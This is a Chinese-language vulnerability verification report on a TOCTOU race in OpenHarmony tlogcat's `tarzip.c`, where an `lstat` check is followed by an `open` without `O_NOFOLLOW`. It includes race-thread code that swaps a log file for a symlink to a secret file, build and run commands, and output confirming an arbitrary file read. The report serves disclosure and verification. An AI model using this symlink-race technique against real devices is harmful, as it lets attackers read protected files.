# PoC 验证报告：WriteSingleFile TOCTOU Race Condition

## 1. 验证方法：Target-Compile

本 PoC 使用 **Target-Compile（目标编译）** 方法。编译真实 `tarzip.c` 为 `.o`，test driver 通过公开入口 `TarZipFiles()` 触发完整调用链，由 race thread 在 lstat→open 窗口内执行 symlink 替换。

验证 Oracle：**Symlink 跟随检测** — 在 instrumented `tee_open()` 中检测打开的文件 inode 是否匹配攻击者指定的 target 文件，证明 open() 跟随了 symlink。

---

## 2. 编译环境

| 项目 | 版本/路径 |
|------|----------|
| 操作系统 | Ubuntu 26.04 LTS, Linux 7.0, x86_64 |
| 编译器 | clang (LLVM), -fsanitize=address |
| 依赖库 | zlib (-lz), pthread (-lpthread) |
| 源码路径 | `tee_client/services/tlogcat/src/tarzip.c` |

---

## 3. 编译的目标代码

| 目标 | 源文件 | 说明 |
|------|--------|------|
| `tarzip.o` | `tarzip.c` (291 行) | **真实 tlogcat 日志压缩代码**，包含 WriteSingleFile、TarZipFiles 等全部函数 |

**编译命令**：

```bash
clang -c -fsanitize=address -fno-omit-frame-pointer -O0 -g \
    -I "$STUBS_DIR" \
    tarzip.c -o tarzip.o
```

---

## 4. 桩代码

`tarzip.c` 依赖以下 OHOS 头文件，通过最小桩实现替代：

| 桩文件 | 替代目标 | 说明 |
|--------|----------|------|
| `securec.h` | `memset_s`, `snprintf_s` | 安全函数，映射到标准 memset/snprintf |
| `tee_log.h` | `tloge`, `tlogw` | 日志宏，映射到 stderr fprintf |
| `tlogcat.h` | `LOG_FILE_INDEX_MAX` | 常量定义 (=3) |
| `tarzip.h` | 函数声明 | TarZipFiles 原型 |
| `tee_file.h` | `tee_open`, `tee_close` | **漏洞根因** — 封装 open() 不带 O_NOFOLLOW |

**关键桩 — tee_file.h（instrumented）**：

```c
/* tee_open: 真实实现就是 open() 不带 O_NOFOLLOW。
 * Instrumented 版本在打开后检测是否跟随了 symlink 到 target 文件 */
static inline int32_t tee_open(const char *path, int flags, unsigned int mode) {
    int fd = open(path, flags, mode);
    // 检测：fstat(fd) 的 inode 是否匹配 target 文件
    // 如果匹配 → 证明 open() 跟随了 symlink
    if (fd >= 0 && fstat(fd).st_ino == stat(target).st_ino) {
        g_tee_open_race_detected = 1;  // 竞争成功
    }
    return fd;
}
```

---

## 5. 漏洞触发过程

### 5.1 触发路径

```
main → TarZipFiles(3, ["/tmp/.../teeOS_log-0", NULL, NULL], output.gz, gid)
     → WriteSingleFile(fileName="/tmp/.../teeOS_log-0", out)
       → JudgeFileValidite(fileName, &fileAttr)
         → lstat(fileName, &st)          [CHECK: st.st_mode == S_ISREG ✓]
         ... RACE WINDOW: racer 将 fileName 替换为 symlink → secret.dat ...
       → WriteZipContent(out, fileName, fileAttr.st_size)
         → tee_open(fileName, O_CREAT|O_RDWR, 0400)  [USE: follows symlink!]
         → read(fd, buf, 512)             [读取 secret.dat 内容]
         → gzwrite(gzFd, buf, 512)        [写入压缩包]
```

### 5.2 Race Thread 行为

```c
while (racing) {
    // Phase 1: 放置普通文件（通过 lstat S_ISREG 检查）
    create_regular_file(bait_path);  // inode A

    usleep(1);

    // Phase 2: 替换为 symlink → target（tee_open 跟随）
    unlink(bait_path);
    symlink(target_path, bait_path);  // 指向 secret.dat
}
```

### 5.3 竞争成功判定

当 `tee_open()` 打开的文件 inode 与 target 文件 inode 一致时，证明：
1. `lstat()` 看到的是普通文件（inode A）
2. `open()` 打开的是 symlink 目标（inode B = secret.dat）
3. 竞争条件成功触发

---

## 6. 输出结果

```
[POC] Test dir: /tmp/tarzip_poc_rKvnpA
[POC] Bait:     /tmp/tarzip_poc_rKvnpA/teeOS_log-0
[POC] Target:   /tmp/tarzip_poc_rKvnpA/secret.dat
[POC] Output:   /tmp/tarzip_poc_rKvnpA/output.tar.gz

[+] tee_open FOLLOWED SYMLINK to target!
[+] RACE WON on attempt 3!
[+] Secret content found in output archive.
[+] tee_open() followed symlink → arbitrary file read confirmed.

[RESULT] TOCTOU race condition CONFIRMED.
  Root cause: JudgeFileValidite uses lstat (CHECK)
              WriteZipContent uses tee_open without O_NOFOLLOW (USE)
```

---

## 7. 代码验证状态

| 维度 | 状态 |
|------|------|
| 源码确认 | 已确认：tarzip.c:142 `tee_open` 无 `O_NOFOLLOW`，tarzip.c:210 `lstat` 检查 |
| 编译验证 | 已通过：真实 tarzip.c 编译为 .o，链接 zlib，0 错误 |
| 正常路径 | 已验证：TarZipFiles 正常压缩文件功能完整 |
| 漏洞触发 | 已验证：race 在 attempt 3 成功，tee_open 跟随 symlink |
| 在真实设备可触发 | 需要 tee uid/gid 对 /data/log/tee/ 有写权限 |
| 验证 Oracle | inode 对比：tee_open 打开的 fd inode ≠ lstat 看到的 inode |

---

## 8. 复现步骤

```bash
# 方式 1：使用 build.sh
./build.sh <tee_client_source_path>

# 方式 2：手动编译
clang -c -fsanitize=address -O0 -g -I stubs/ tarzip.c -o tarzip.o
clang -c -fsanitize=address -O0 -g -I stubs/ poc.c -o poc.o
clang -fsanitize=address -o poc tarzip.o poc.o -lz -lpthread
./poc
# 预期：[RESULT] TOCTOU race condition CONFIRMED.
```

---

## 9. PoC 类型声明

| 维度 | 说明 |
|------|------|
| 编译方式 | Target-Compile：编译真实 OHOS tarzip.c 为 .o |
| 链接目标 | tarzip.o（真实源码），不是 mock/模拟 |
| 正常路径 | 已验证：TarZipFiles 正常执行压缩 |
| 漏洞触发 | 已验证：TOCTOU race 成功，symlink 被跟随 |
| 验证 Oracle | Instrumented tee_open 检测 inode 不一致 |
